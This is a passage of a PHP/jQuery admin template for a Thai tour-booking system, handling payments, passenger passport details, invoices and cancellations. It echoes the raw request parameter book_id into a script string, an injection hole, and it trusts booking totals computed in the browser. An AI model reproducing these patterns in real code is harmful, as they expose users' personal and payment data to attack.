                                <div class="clearfix">
                                   
                                   <?php echo $print_inv; ?>
                                    <button type="button" class="mb-sm btn btn-primary pull-right" style="margin-left: 20px;" onclick="check_submit('<?php echo $method ?>')"; <?php echo $disabled_booking ?>>
                                        Booking
                                    </button>
                                </div>

                            </div>
                        </div>
                    </div>
                     <div id="transactions_pay" role="tabpanel" class="tab-pane">
                        <div class="panel">
                            <div class="panel-body">
                                <h3 class="mt0" id ="lblbook_id_tab_payment" name ="lblbook_id_tab_payment">รหัสการจอง <?php echo $book_code; ?></h3>
                                <hr>
                                
                                <div class="row row-table row-flush">
                                    <div class="col-lg-4 col-xs-12 pv bb br">
                                        <div class="col-lg-3 col-xs-12">
                                            <h3 class="">Total : </h3>
                                        </div>
                                        <div class="col-lg-6 col-xs-12">
                                            <h3 class="blue" id ="lbltotal" name ="lbltotal"></h3>
                                        </div>
                                    </div>
                                    <div class="col-lg-4 col-xs-12 pv bb br">
                                        <div class="col-lg-6 col-xs-12">
                                            <h3 class="">Amount Receive : </h3>
                                        </div>
                                        <div class="col-lg-5 col-xs-12">
                                            <h3 class="blue" id="lblreceipt" name ="lblreceipt"></h3>
                                        </div>
                                    </div>
                                    <div class="col-lg-4 col-xs-12 pv bb br">
                                        <div class="col-lg-6 col-xs-12">
                                            <h3 class="">Total balance : </h3>
                                        </div>
                                        <div class="col-lg-6 col-xs-12">
                                            <h3 class="red" id ="lblbalance" name="lblbalance" ></h3>
                                        </div>
                                    </div>
                                </div>
                                <hr>
                                <table id="" class="table table-bordered table-hover table-devgun">
                                    <thead>
                                        <tr>
                                            <th width="5%">#</th>
                                            <th>Payment</th>
                                            <th>จำนวนเงิน</th>
                                            <th>วันที่ครบกำหนดชำระ</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td class="text-center">1</td>
                                            <td class="text-center">Deposit</td>
                                            <td class="text-center" id="book_master_deposit" name ="book_master_deposit"></td>
                                            <td class="text-center" id="date_deposit" name ="date_deposit"></td>
                                        </tr>
                                         <tr>
                                            <td class="text-center">2</td>
                                            <td class="text-center">Full payment</td>
                                            <td class="text-center" id="book_master_full_payment" name ="book_master_full_payment"></td>
                                            <td class="text-center" id="date_full_payment" name ="date_full_payment"></td>
                                        </tr>
                                    </tbody>
                                </table>
                                <hr>

                                
                                <div class="panel panel-default ">
                                    <div class="panel-heading"></div>
                                    <!-- START table-responsive-->
                                    <div class="panel-body " id="">
                                        <div class="table-responsive" id="interface_table">
                                            
                                        </div>
                                    </div>
                                
                                    <div class="panel-body" id="interface_pagination">
                                        
                                    
                                    </div>

                                </div>
             
                             <div class="panel">
                            <div class="panel-body" align="center">
                                <button type="button" class="mb-sm btn btn-green" onclick="manage_transactions_pay('add')" <?php echo $disabled_payment ?>> 
                                    <em class="icon-plus"></em>
                                    เพิ่มการชำระเงิน                             </button>
                            </div>
                        </div>
                        </div>
                        </div>

                       

                    </div>
                    <div id="transactions_passenger" role="tabpanel" class="tab-pane">
                        <div class="panel">
                            <div class="panel-body">
                                <h3 class="mt0" id ="lblbook_id_tab_room" name ="lblbook_id_tab_room">รหัสการจอง <?php echo $book_code; ?></h3>
                                <hr>
                                
                                <div id="div_room">
                                </div>
                                <hr>
                             
                            </div>
                        </div>

                        <div class="panel">
                            <div class="panel-body" align="center">
                               <button type="button" class="btn btn-primary" onclick="check_submit_room()" <?php echo $disabled_submit_room ?>>
                                <em class="icon-cursor"></em>
                                    บันทีก
                                </button>
                            </div>
                        </div>

                    </div>
                </div>

            </div>

         </div>
      </section>

    <?php include_once('../includes/footer.php');?>
    <?php include_once('../includes/tag_script.php');?>                                                                                                                    



   <!-- TMP HTML-->

    <div id="modal-manage-book-list" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" class="modal fade">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" data-dismiss="modal" aria-label="Close" class="close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                    <h4 id="myModalLabel" class="modal-title">เพิ่ม/แก้ไขรายการ</h4>
                </div>
                <div class="modal-body">

                    <div class="form-horizontal">

                        <div class="form-group">
                            <label class="col-lg-3  control-label">Code :</label>
                            <div class="col-lg-7 ">
                                <input type="text" class="form-control" id="book_list_code" name="book_list_code" value="">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="col-lg-3 control-label">Description :</label>
                            <div class="col-lg-7">
                                <input type="text" class="form-control" id="book_list_description" name="book_list_description" value="">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="col-lg-3 control-label">Unit Price :</label>
                            <div class="col-lg-7">
                                <input type="text" class="form-control" id="book_list_unit_price" name="book_list_unit_price" value="">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="col-lg-3 control-label">Unit :</label>
                            <div class="col-lg-7">
                                <input type="text" class="form-control" id="book_list_unit" name="book_list_unit" value="">
                            </div>
                        </div>

                        <div class="form-group">
                            
                            <div class="col-lg-offset-3 col-lg-7">
                                <button type="button" class="mb-sm btn btn-danger btn-xs">
                                    <em class="text-center"></em>
                                    ลบรายการนี้                          </button>
                            </div>
                        </div>
                        <div class="form-group">

                        </div>
                        
                    </div>


                </div>


                <div class="modal-footer">
                    <button type="button" data-dismiss="modal" class="btn btn-default">ปิด</button>
                    <button type="button" class="btn btn-primary" onclick="check_submit_user_group('.$method.')">
                        <em class="icon-cursor"></em>
                        บันทีก
                    </button>
                </div>

            </div>
        </div>
    </div>

    



  
   <script>

        
        var bus_no = '<?php echo $bus_no;?>';
        var book_id = '<?php echo $_REQUEST["book_id"];?>';
        var url_search  = 'action_manage_booking.php';
        var data_search;
        var page       = 0;
        var page_limit = 99;
        var data       = [];
        var tmp_data   = [];
        var qty_per_1 = 0;
        var qty_per_2 = 0;
        var qty_per_3 = 0;
        var qty_per_4 = 0;
        var qty_per_5 = 0;
        var qty_single_charge = 0;
        var total_per_1 = 0;
        var total_per_2 = 0;
        var total_per_3 = 0;
        var total_per_4 = 0;
        var total_per_5 = 0;
        var total_single_charge = 0;
        var total_com_company_agency = 0;
        var total_com_agency = 0;
        var total =  0;
        var amountgrandtotal = 0;
        var deposit_total = 0;
        var fullpayment_total = 0;
        var tempseat = 0;
        var temp_qty = '<?php echo $temp_qty;?>';;
        var index = '<?php echo $index;?>';
        var inv_rev_no = '<?php echo $inv_rev_no;?>';
        var check_ex = '';
        var sum_qty = 0;
        $(document).ready(function(e){
            
            $('#select_bus').change(function(){

                get_data_by_bus_no($(this).val());
               
            });

            $('#seat_adult').change(function(){
                calculatetotal();
            });
            $('#seat_child').change(function(){
                calculatetotal();
            });
            $('#seat_child_no_bed').change(function(){
                calculatetotal();
            });
            $('#seat_infant').change(function(){
                calculatetotal();
            });
            $('#seat_joinland').change(function(){
                calculatetotal();
            });
            $('#seat_single').change(function(){
                calculatetotal();
            });
           

            $('#select_bus').val(bus_no).trigger('change');

            calculatetotal();
        })

  

        function get_room_type(){
            block_ui();
          
        
            $.post('action_manage_booking.php',
            {

                method          : 99,
                book_id         : $('#book_id').val(), // global
                book_code       : $('#book_code').val(), // global
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);
                $('#div_room').html(data_j.div_room);
                $('.btn-room-file[href="javascript:;"]').addClass('disabled');
                $('select').chosen();
                CREATE_INPUT_DATE_SEARCH();
                
                
            })
            setTimeout(function() {
                unblock_ui();
                
                
            }, 500);
        }



    
        function manage_book_list(action_method,book_list_id){


            $('#modal-manage-book-list').modal('show');


        }
        function calculatetotal(){
               
          
           per_1 = <?=$price_1?>;
           per_2 = <?=$price_2?>;
           per_3 = <?=$price_3?>;
           per_4 = <?=$price_4?>;
           per_5 = <?=$price_5?>;
           per_single_charge = <?=$single_charge?>;
           per_com_company_agency = <?=$per_com_company_agency?>;
           per_com_agency = <?=$per_com_agency?>;
           ser_deposit = <?=$ser_deposit?>;
           qty_per_1 = $('#seat_adult').val();
           qty_per_2 = $('#seat_child').val();
           qty_per_3 = $('#seat_child_no_bed').val();
           qty_per_4 = $('#seat_infant').val();
           qty_per_5 = $('#seat_joinland').val();
           qty_single_charge = $('#seat_single').val();
           discount = 0;
          
          
         
           sum_qty = parseInt(qty_per_1) + parseInt(qty_per_2) + parseInt(qty_per_3) + parseInt(qty_per_4) + parseInt(qty_per_5);
          // qty_receipt = (parseInt(tempseat) + parseInt(temp_qty)) - parseInt(sum_qty);
          // $('#qty_receipt').html(qty_receipt);
           
            total_per_1 = per_1 * qty_per_1;
            total_per_2 = per_2 * qty_per_2;
            total_per_3 = per_3 * qty_per_3;
            total_per_4 = per_4 * qty_per_4;
            total_per_5 = per_5 * qty_per_5;
            total_single_charge = per_single_charge * qty_single_charge;
            total_com_company_agency = per_com_company_agency * sum_qty;
            total_com_agency = per_com_agency * sum_qty;
            
            deposit_total = 0;
            if ($('#txtdepositdate').val() != ''){
            deposit_total = ser_deposit * sum_qty;
            }
 

            $('#qty_price_1').html(qty_per_1);
            $('#total_perice_1').html(total_per_1);

            $('#qty_price_2').html(qty_per_2);
            $('#total_perice_2').html(total_per_2);

            $('#qty_price_3').html(qty_per_3);
            $('#total_perice_3').html(total_per_3);

            $('#qty_price_4').html(qty_per_4);
            $('#total_perice_4').html(total_per_4);

            $('#qty_price_5').html(qty_per_5);
            $('#total_perice_5').html(total_per_5);

            $('#qty_single_charge').html(qty_single_charge);
            $('#total_single_charge').html(total_single_charge);

            $('#qty_com_company_agency').html(sum_qty);
            $('#total_com_company_agency').html('-'+ total_com_company_agency);

            $('#qty_com_agency').html(sum_qty);
            $('#total_com_agency').html('-'+ total_com_agency);


            
             sumtotal_ex = 0;
            
           
            $('font[name="total_ex[]"]').each(function(){
              sumtotal_ex = parseInt(sumtotal_ex) +  parseInt($(this).html());
            });
            total =  (parseInt(total_per_1) + parseInt(total_per_2) + parseInt(total_per_3) + parseInt(total_per_4) + parseInt(total_per_5) + parseInt(total_single_charge) + parseInt(sumtotal_ex) ) - (parseInt(total_com_company_agency) + parseInt(total_com_agency));
            amountgrandtotal = total - discount;

            $('#amountgrandtotal').html(amountgrandtotal.toFixed(2).replace(/(\d)(?=(\d{3})+\.)/g, '$1,'));
            $('#deposit_total').html(deposit_total.toFixed(2).replace(/(\d)(?=(\d{3})+\.)/g, '$1,'));
             fullpayment_total = parseInt(amountgrandtotal) - parseInt(deposit_total);
            $('#fullpayment_total').html(fullpayment_total.toFixed(2).replace(/(\d)(?=(\d{3})+\.)/g, '$1,'));
        }

        function get_data_by_bus_no(bus_no){
            
          if (bus_no == null){
           bus_no = '<?php echo $bus_no ?>'
          }
            $.post('action_manage_booking.php',
            {
                method      : 2,
                bus_no      : bus_no,
                per_id      : '<?php echo $per_id ?>', // global
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);
                $('#qty_receipt').html(data_j.qty_receipt);
               // tempseat = data_j.qty_receipt;
                
            })

        }

        function manage_transactions_pay(action_method,pay_id){

            $('#modal-manage-transactions-pay').remove();
            $.post('action_manage_booking.php',
            {
                method          : 6,
                action_method   : action_method,
                pay_id          : pay_id
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);

                $('body').append(data_j.modal);
                $(":file").filestyle('clear');
                $('select').chosen();
                $('#modal-manage-transactions-pay').modal('show');
                CREATE_INPUT_DATE_SEARCH();
            });



           

        }

        function get_bankbook(bankbook_id){

             $.post('action_manage_booking.php',
            {
                method      : 9,
                bankbook_id      : bankbook_id,
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);
                $('#bankbook_code').val(data_j.bankbook_code);
                $('#bankbook_name').val(data_j.bankbook_name);
                $('#bankbook_branch').val(data_j.bankbook_branch);
            })

        }

        function manage_cancel_booking(booking_id){
            $('#modal-manage-cancel-booking').modal('show');
        }

        function manage_discount(booking_id){
            $('#modal-manage-discount-booking').modal('show');
        }

        function manage_upload(room_id){
            $('#modal-manage-room').remove();

            $.post('action_manage_booking.php',
            {
                method      : 20,
                room_id     : room_id
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);
                $('body').append(data_j.modal);
                $('#modal-manage-room').modal('show');
                $(":file").filestyle('clear');
            });
            
            
        }

        function upload_file_room(room_id){

            if($('#file_room').val() == ''){
                swal('กรุณาเลือกไฟล์');
            }
            else{  

                var formData = new FormData();
                formData.append('room_id',room_id);
                formData.append('file_room', $('#file_room')[0].files[0]);
                formData.append('method',21);

                $('#modal-manage-room').modal('hide');
                $('#content-wrapper').addClass('whirl double-up');
                $.ajax({
                    url : 'action_manage_booking.php',
                    type : 'POST',
                    data : formData,
                    processData: false,  // tell jQuery not to process the data
                    contentType: false,  // tell jQuery not to set contentType
                    success : function(data) {
                        console.log(data);
                        get_room_type();
                        /*setTimeout(function() {
                            $('#content-wrapper').removeClass('whirl double-up');
                            
                        }, 500);*/
                    }
                });

            }

            


        }

        function add_price_ex(){
             $('#modal-manage-price-ex').modal('show');
             $('#name_ex').val('');
             $('#price_ex').val('0');

        }

        qty_seat = 0;
        
        function check_submit(method){
          
            if ($('#select_bus').val() == null){
                bus_no = '<?php echo $bus_no ?>'
            }else{
                bus_no = $('#select_bus').val();
            }
        $.post('action_manage_booking.php',
        {
            method      : 2,
            bus_no      : bus_no,
            per_id      : '<?php echo $per_id ?>', // global
        },function(data,textStatus,xhr){
            data_j = JSON.parse(data);
         
            qty_receipt = data_j.qty_receipt;
            if (method == '4') { // case edit data
            qty_seat = (parseInt(qty_receipt) + parseInt(temp_qty)) - parseInt(sum_qty);
            }else{ // case add new
            qty_seat = parseInt(qty_receipt)  - parseInt(sum_qty);
            }
              if (qty_seat < 0) {
                swal('จำนวนที่ว่างไม่พอ สำหรับการจอง','','warning');
                 $('#qty_receipt').html(qty_receipt);
                return;
         }
        })
        
        
                
                SWEET_ALERT_CONFIRM('ยืนยันการบันทึกข้อมูล','','submit_booking('+method+')');


        }


        function submit_booking(method){
          
                block_ui();
            
                
                if ($('#select_bus').val() == null){
                    bus_no = '<?php echo $bus_no ?>'
                }else{
                    bus_no = $('#select_bus').val();
                }


                 ex_name_arr                = [];
                 ex_price_arr               = [];
                 ex_qty_arr                 = [];
                 ex_total_arr               = [];

                $('label[name="ex_name[]"]').each(function(){
                    ex_name_arr.push($(this).html().replace(' :',''));
                });
                $('select[name="ex_select[]"]').each(function(){
                    ex_qty_arr.push($(this).val());
                });
                $('font[name="ex_price[]"]').each(function(){
                    ex_price_arr.push($(this).html());
                });
                $('font[name="total_ex[]"]').each(function(){
                    ex_total_arr.push($(this).html());
                });
               
                $.post('action_manage_booking.php',{
                book_id                     : $('#book_id').val(),
                book_code                   : $('#book_code').val(),
                invoice_code                : $('#invoice_no').html(),
                inv_rev_no                  : inv_rev_no,
                agen_id                     : $('#agency_booking').val(),
                user_id                     : $('#sale_contact').val(),
                per_id                      : '<?php echo $per_id ?>',
                bus_no                      : bus_no,
                book_total                  : total,
                book_discount               : 0,
                book_amountgrandtotal       : amountgrandtotal,
                book_comment                : $('#txtextra').val(),
                book_master_deposit         : deposit_total,
                book_due_date_deposit       : $('#txtdepositdate').val(),
                book_master_full_payment    : fullpayment_total,
                book_due_date_full_payment  : $('#txtfullpaymentdate').val(),
                book_com_agency_company     : total_com_company_agency,
                book_com_agency             : total_com_agency,
                remark                      : '',
                book_room_twin              : $('#seat_twin').val(),
                book_room_double            : $('#seat_double').val(),
                book_room_triple            : $('#seat_triple').val(),
                book_room_single            : $('#seat_single').val(),
                
                // list
                per_price_1                  : $('#per_price_1').html(),
                per_qty_1                    : $('#qty_price_1').html(),
                per_total_1                  : total_per_1,
                per_price_2                  : $('#per_price_2').html(),
                per_qty_2                    : $('#qty_price_2').html(),
                per_total_2                  : total_per_2,
                per_price_3                  : $('#per_price_3').html(),
                per_qty_3                    : $('#qty_price_3').html(),
                per_total_3                  : total_per_3,
                per_price_4                  : $('#per_price_4').html(),
                per_qty_4                    : $('#qty_price_4').html(),
                per_total_4                  : total_per_4,
                per_price_5                  : $('#per_price_5').html(),
                per_qty_5                    : $('#qty_price_5').html(),
                per_total_5                  : total_per_5,

                ex_name_arr                  : ex_name_arr,
                ex_price_arr                 : ex_price_arr,
                ex_qty_arr                   : ex_qty_arr,
                ex_total_arr                 : ex_total_arr,
                
                method          : method,

            },function(data,textStatus,xhr){
                 unblock_ui();

                data_j = JSON.parse(data);
                
                if (data_j.status == 200) {
                   if (method == 3) {
                       window.open("../booking/", "_parent");
                      // get_booking_insert(data_j.book_id);
                    }else{
                      get_booking_update();  
                    }
                }else {
                    SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);

                }
               

            });

        }
        function get_booking_insert(book_id){
             $.post('action_manage_booking.php',
            {
                method      : 11,
                book_id      : book_id,
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);
                $('#book_id').val(data_j.book_id);
                $('#book_code').val(data_j.book_code);
                $('#lblbook_id_tab_booking').text('รหัสการจอง '+ data_j.book_code);
                $('#lblbook_id_tab_payment').text('รหัสการจอง '+ data_j.book_code);
                $('#lblbook_id_tab_room').text('รหัสการจอง '+ data_j.book_code);
                $('#sale_agency_name').html(data_j.agen_name);
                $('#sale_agency_email').html(data_j.agen_email);
                $('#sale_agency_tel').html(data_j.agen_tel);
                $('#sale_agency_company').html(data_j.agen_com_name);
                $('#sale_booking_date').html(data_j.book_date);
                $('#invoice_no').html(data_j.invoice_code);
                $('#qty_receipt').html(data_j.qty_receipt);
            })
        }
        function get_booking_update(){
             $.post('action_manage_booking.php',
            {
                method      : 11,
                book_id      : $('#book_id').val(),
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);
                $('#invoice_no').html(data_j.invoice_code);
                $('#qty_receipt').html(data_j.qty_receipt);
                inv_rev_no = data_j.inv_rev_no;
            })
        }
        function get_payment(){
              
            
                data_search = {

                book_id     : $('#book_id').val(),
                offset      : page,
                method      : 5

                };

            GET_LIST_TABLE_NO_LIMIT(data_search,url_search);
            get_payment_detail();
         }
         function get_payment_detail(){
           
          $.post('action_manage_booking.php',
            {
                method      : 12,
                book_id      : $('#book_id').val(),
            },function(data,textStatus,xhr){
                data_j = JSON.parse(data);
                $('#lbltotal').text(data_j.book_amountgrandtotal);
                $('#lblreceipt').text(data_j.book_receipt);
                $('#lblbalance').text(data_j.book_balance);
                $('#book_master_deposit').html(data_j.book_master_deposit);
                $('#date_deposit').html(data_j.book_due_date_deposit);
                $('#book_master_full_payment').html(data_j.book_master_full_payment);
                $('#date_full_payment').html(data_j.book_due_date_full_payment);
            })

         }
        function check_submit_payment(method){
            $('#content-wrapper').addClass('whirl double-up');
          
            var formData = new FormData();

            formData.append('method',10);

            formData.append('pay_url_file_old', $('#pay_url_file_old').attr('url'));
           


            if($('#pay_url_file').val()!=''){
                formData.append('pay_url_file', $('#pay_url_file')[0].files[0]);
            }
           

            $('input[type="file"]').prop('disabled',true);
            
            $.ajax({
                url             : 'action_manage_booking.php',
                type            : 'POST',
                data            : formData,
                processData     : false,  // tell jQuery not to process the data
                contentType     : false,  // tell jQuery not to set contentType
                success         : function(data) {
                    $('#content-wrapper').removeClass('whirl double-up');
                    $('input[type="file"]').prop('disabled',false);
                    data_j  = JSON.parse(data);
                    $('#pay_url_file_old').attr('href',(data_j.pay_url_file));
                 

                    $('#pay_url_file_old').attr('url',(data_j.pay_url_file));
                 


                 //   SWEET_ALERT_CONFIRM('ยืนยันการบันทึกข้อมู�?,'','submit_review('+method+')');
                }
            });



                if($('#select_bankbook').val() == ''){
                 swal('กรุณาระบุธนาคาร*','','warning');
                return;
            }
          
            else{
              
                    SWEET_ALERT_CONFIRM('ยืนยันการบันทึกข้อมูล','','submit_payment('+method+')');
                }

        }
        function submit_payment(method){
            str = $('#pay_url_file_old').attr('url');
            var pay_url_file_old = str.replace("/admin", "");

            block_ui();
            $('#modal-manage-transactions-pay').modal('hide');
               $.post('action_manage_booking.php',
            {

                method          : method,
                pay_id                     : $('#pay_id').val(),
                pay_date                   : $('#pay_date').val(),
                pay_time                   : $('#pay_time').val(),
                pay_url_file               : pay_url_file_old,
                pay_received               : $('#pay_received').val(),
                book_id                    : $('#book_id').val(),
                book_code                  : $('#book_code').val(),
                book_status                : $('input[name="status_booking"]:checked').val(),
                bankbook_id                : $('#select_bankbook').val(),
                remark                      : $('#txtremark_payment').val(),
                user_id                      : '<?php echo $user_id ?>',




            },function(data,textStatus,xhr){
                unblock_ui();
                console.log(data);

                data_j = JSON.parse(data);
                SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);

               get_payment();

            });
        }
        function approve_payment(pay_id,book_status){
             SWEET_ALERT_CONFIRM('ยืนยันการอนุมัติ','','submit_approve('+pay_id+','+book_status+')');
        }
        function submit_approve(pay_id,book_status){
            $('#content-wrapper').addClass('whirl double-up');
               $.post('action_manage_booking.php',
            {

                method                          : 13,
                pay_id                          : pay_id,
                book_status                     : book_status,
                book_id                         : $('#book_id').val(),

            },function(data,textStatus,xhr){
                 $('#content-wrapper').removeClass('whirl double-up');
                console.log(data);

                data_j = JSON.parse(data);
                SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);

               get_payment();
               
               $('#div_status').html(html_status_book(book_status));
               
            });
        }
        function cancel_approve_payment(pay_id){
             SWEET_ALERT_CONFIRM('ยืนยันการไม่อนุมัติ','','submit_cancel_approve('+pay_id+')');
        }
           function submit_cancel_approve(pay_id){
            $('#content-wrapper').addClass('whirl double-up');
               $.post('action_manage_booking.php',
            {

                method                          : 14,
                pay_id                          : pay_id,
                book_id                         : $('#book_id').val(),

            },function(data,textStatus,xhr){
                 $('#content-wrapper').removeClass('whirl double-up');
                console.log(data);

                data_j = JSON.parse(data);
                SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);

               get_payment();
               
               $('#div_status').html(html_status_book(data_j.book_status));
               
            });
        }
        function manage_cancel_payment(pay_id){
             SWEET_ALERT_CONFIRM('ยืนยันการยกเลิกรายการ','','submit_cancel_payment('+pay_id+')');
        }
        function submit_cancel_payment(pay_id){
                $('#content-wrapper').addClass('whirl double-up');
                $('#modal-manage-transactions-pay').modal('hide');
               $.post('action_manage_booking.php',
            {
                method                          : 15,
                pay_id                          : pay_id,
            },function(data,textStatus,xhr){
                 $('#content-wrapper').removeClass('whirl double-up');
                console.log(data);

                data_j = JSON.parse(data);
                SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);

               get_payment();
               
            });
        }
        function check_submit_room(){
             counter_input_null = true;

             $('input[required]').each(function(e){
                if($(this).val()==''){
                    counter_input_null = false;
                    $(this).focus();
                    swal('กรุณากรอกข้อมูลให้ครบถ้วน','','warning');
                    return false;

                }

            });
            $('.period_requried').each(function(e){

                if($(this).val()==''){
                    $(this).focus();
                    swal('กรุณากรอกข้อมูลให้ครบ','','warning');
                    counter_input_null = false;
                    return false;
                }
            }); 
            
            if(counter_input_null == false){
                return;
            }
            else{

                    SWEET_ALERT_CONFIRM('ยืนยันการบันทึกข้อมูล','','submit_book()');

            }
        }
        function submit_book(){
            firstname_array         = [];
            lastname_array          = [];
            fullname_array          = [];
            sex_array               = [];
            country_array           = [];
            national_array          = [];
            address_array           = [];
            birthday_array          = [];
            passportno_array        = [];
            expire_array            = [];
            room_file_array         = [];
            remark_array            = [];
            career_array            = [];
            placeofbirth_array            = [];
            place_pp_array            = [];
            date_pp_array            = [];

            $('input[name="firtname[]"]').each(function(){
                firstname_array.push($(this).val());
            });
            $('input[name="lastname[]"]').each(function(){
                lastname_array.push($(this).val());
            });
            $('input[name="room_name_thai[]"]').each(function(){
                fullname_array.push($(this).val());
            });
             $('select[name="sex[]"]').each(function(){
                sex_array.push($(this).val());
            });
            $('input[name="country[]"]').each(function(){
                country_array.push($(this).val());
            });
            $('input[name="national[]"]').each(function(){
                national_array.push($(this).val());
            });
            $('input[name="address[]"]').each(function(){
                address_array.push($(this).val());
            });
             $('input[name="birthday[]"]').each(function(){
                birthday_array.push($(this).val());
            });
             $('input[name="passportno[]"]').each(function(){
                passportno_array.push($(this).val());
            });
             $('input[name="expire[]"]').each(function(){
                expire_array.push($(this).val());
            });
             $('input[name="remark[]"]').each(function(){
                remark_array.push($(this).val());
            });
              $('input[name="room_file[]"]').each(function(){
                room_file_array.push($(this).val());
            });
            $('input[name="career[]"]').each(function(){
                career_array.push($(this).val());
            });
            $('input[name="placeofbirth[]"]').each(function(){
                placeofbirth_array.push($(this).val());
            }); 
            $('input[name="place_pp[]"]').each(function(){
                place_pp_array.push($(this).val());
            }); 
            $('input[name="date_pp[]"]').each(function(){
                date_pp_array.push($(this).val());
            });        
      
            block_ui();
            
            
              $.post('action_manage_booking.php',
            {

                method                      : 16,
                book_code                   : $('#book_code').val(),
                firstname_arr               : firstname_array,
                lastname_arr                : lastname_array,
                fullname_arr                : fullname_array,
                sex_arr                     : sex_array,
                country_arr                 : country_array,
                national_arr                : national_array,
                address_arr                 : address_array,
                birthday_arr                : birthday_array,
                passportno_arr              : passportno_array,
                expire_arr                  : expire_array,
                room_file_arr             : room_file_array,
                remark_arr                  : remark_array,
                career_arr                  : career_array,
                placeofbirth_arr                 : placeofbirth_array,
                place_pp_arr                 : place_pp_array,
                date_pp_arr                : date_pp_array

            },function(data,textStatus,xhr){
            unblock_ui();
                
                data_j = JSON.parse(data);
                SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);
              
            });


          
        }

        function add_ex(){
            ex_name = $('#name_ex').val();
            ex_price = $('#price_ex').val();
            $('#modal-manage-price-ex').modal('hide');
            $.post('action_manage_booking.php',
            {
                ex_name   : ex_name,
                ex_price   : ex_price,
                index : index,
                method  : 17
            },function(data,textStatus,xhr){
               
                data_j = JSON.parse(data);

                $('#contant_ex').append(data_j.exname_input);
                $('#contant_ex_price').append(data_j.exprice_input);
                $('select').chosen();
                index = index +1;
            });


        }

        $('body').on('click','.del_ex',function(){

            $(this).parent().parent().parent().parent().parent().remove();

            var list = $(this).attr('list');
            
            $('#list_'+list).remove();

           
            calculatetotal();
                index = index -1;
            
        });
         $('body').on('change','.onchange_select',function(){
             var list = $(this).attr('index');
             var ex_select = $(this).val();
             var ex_price = $('#ex_price_'+list).html();
             var ex_total = parseInt(ex_price) * parseInt(ex_select);
           $('#ex_qty_'+list).html(ex_select);
           $('#ex_total_'+list).html(ex_total);
             calculatetotal();

        });

        function print_invoice(book_id,book_code){

            window.open("../admin/print/pdf_invoice.php?book_id="+book_id+"&book_code="+book_code, "_blank", "width=800,height=800");

        }

        function print_receipt(book_id,receipt_code,book_code){
             var   re = /'/gi;
             book_code = book_code.replace(re, "");
            
            if (receipt_code == null || receipt_code == '' ){  // update receipt no
                 $.post('action_manage_booking.php',
            {

                method                      : 18,
                book_id                   : book_id

            },function(data,textStatus,xhr){
                
                data_j = JSON.parse(data);
               if (data_j.status == 200){
                window.open("../print/pdf_receipt.php?book_id="+book_id+"&book_code="+book_code, "_blank", "width=800,height=800");
                    
               }else{
                     SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);
               }
              
            });

            }else {
                 window.open("../print/pdf_receipt.php?book_id="+book_id+"&book_code="+book_code, "_blank", "width=800,height=800");
            }
          

        }
        

        function send_email_invoice(book_code){

            $('#content-wrapper').addClass('whirl double-up');
            $('button').prop('disabled',true);
            $.post('action_manage_booking.php',
            {
                book_code       : book_code,
                method          : 30
            },function(data,textStatus,xhr){
               
                data_j = JSON.parse(data);

                setTimeout(function() {
                    $('#content-wrapper').removeClass('whirl double-up');
                    $('button').prop('disabled',false);

                    if(data_j.status == 'TRUE'){
                        swal("ส่งEmail เรียบร้อย", "", "success");
                    }
                    else{
                        swal("ส่งEmail ไม่สำเร็จกรุณาลองใหม่ภายหลัง", "", "warning");
                    }

                }, 500);
            });

        }
        function get_money_cancel(){
           select_cancel = $('#select_cancel').val();
           refund_deposit = $('#refund_deposit').val();
           refund_full_payment = $('#refund_full_payment').val();
           full_amount = parseInt(refund_deposit) + parseInt(refund_full_payment);
           
            if (select_cancel == 1){
                    $('#refund_money').val(full_amount);
            }else if (select_cancel == 2){
                    $('#refund_money').val('<?=$book_master_deposit?>');
            }else if (select_cancel == 3){
                    $('#refund_money').val(0);
            }else {
                    $('#refund_money').val(0);
            }
        }
        function check_submit_cancel(){
            refund_money = $('#refund_money').val();
            amount_receive = $('#amount_receive').val();
            if (parseInt(refund_money) > parseInt(amount_receive)){
                    swal("จำนวนเงินที่คืนมากกว่าจำนวนเงินทีได้รับ", "", "warning");
                    return;
            }
            SWEET_ALERT_CONFIRM('ยืนยัน ยกเลิกการจอง','','submit_cancel()');
        }
        function submit_cancel(){
            $('#content-wrapper').addClass('whirl double-up');
             refund_money = $('#refund_money').val();
             amount_receive = $('#amount_receive').val();
             book_receipt = parseInt(amount_receive) - parseInt(refund_money);
              $.post('action_manage_booking.php',
            {

                method                      : 19,
                status_cancel               : $('#select_cancel').val(),
                book_id                     : $('#book_id').val(),
                book_receipt                : book_receipt,
                book_cancel                 : refund_money,
                remark_cancel                 :  $('#txtremark_cancel').val()

            },function(data,textStatus,xhr){
             $('#content-wrapper').removeClass('whirl double-up');
             $('#modal-manage-cancel-booking').modal('hide');
             
                data_j = JSON.parse(data);
                SWEET_ALERT_INSER_UPDATE(data_j.status,data_j.type_alert);
              
                  if (data_j.status == 200){
                    $('#div_status').html(html_status_book(40));
                  //  document.getElementById('btncancel').style.visibility = 'hidden';
                  }
            });
        }
   </script>
</body>
</html>				   